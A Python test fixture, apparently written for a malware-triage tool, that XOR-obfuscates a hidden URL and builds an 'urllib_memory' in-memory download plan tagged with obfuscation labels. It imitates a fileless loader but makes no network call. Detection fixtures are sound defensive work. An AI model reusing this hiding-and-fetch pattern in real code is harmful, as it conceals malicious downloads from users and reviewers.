#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_664e9020 = "nDBB2keeaAPVCYtuAtNdmGgs1FGHYgfDGI5kANZVnm4b-VmPYBzUTZZsF8dEnmgBm0GYYR_PVrVgFstbmHQP1UCLahb5V4V4HdIJ23EA31qebAubUZJuFtZAg2Id-VGSfQHDR5lkHMhIhW8V00eJbAfPW4QwHsdGmWUSymuPYwXDWIV9FvlEhmwd2leLfwHPUZgwA99VmGAc1GuFbxXTR4lsB8NQlnoayFCFegD5V4JsGsgJnX4Q1F2aeSzSW7V9CtJchWMPxVWHfRLPU4RSGsIJiWwe1lWDah2LAN9pEZ4H3jVBn0iffx-bXJ55A9UOxSJHk1CINUCSDNg0XcNMi2ADylHEZB3QVYZkF4kD0zRKlAWPaV3WTZZ4AMNGtWwUw1qeMDvTWp5_FtVHunQHzluEIkeTUIg1QJIM2DQ="
CODEC_664e9020 = "urlsafe_base64|repeating_key_xor|ea,0d,73,a6,34"

def load_664e9020():
    return base64.urlsafe_b64decode(MATERIAL_664e9020)

def decode_664e9020(e):
    key_bytes = (234, 13, 115, 166, 52,)
    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(e))

def recover_664e9020():
    n = ":".join(("north", "south"))
    d = decode_664e9020(load_664e9020())
    t = d.decode("ascii", "strict")
    return t

def inspect_664e9020():
    view = memoryview(recover_664e9020().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_664e9020():
    try:
        raise LookupError("surface")
    except LookupError:
        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

def obfuscation_664e9020():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_664e9020():
    fields = dict(item.split("=", 1) for item in inspect_664e9020().split("|"))
    analysis_surface = surface_664e9020()
    obfuscation_surface = obfuscation_664e9020()
    operation_plan = ("urllib_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_664e9020())
